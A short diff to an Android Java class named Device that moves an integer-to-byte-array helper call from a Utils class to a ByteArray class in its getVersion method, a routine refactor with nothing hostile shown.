@@ -14,8 +14,8 @@ import android.telephony.cdma.CdmaCellLocation;
 import android.telephony.gsm.GsmCellLocation;
 
 import com.android.networking.auto.Cfg;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
-import com.android.networking.util.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -69,7 +69,7 @@ public class Device {
 	 * @return the version
 	 */
 	public byte[] getVersion() {
-		final byte[] versionRet = Utils.intToByteArray(Version.VERSION);
+		final byte[] versionRet = ByteArray.intToByteArray(Version.VERSION);
 		if (Cfg.DEBUG) {
 			Check.ensures(versionRet.length == 4, "Wrong version len"); //$NON-NLS-1$
 		}
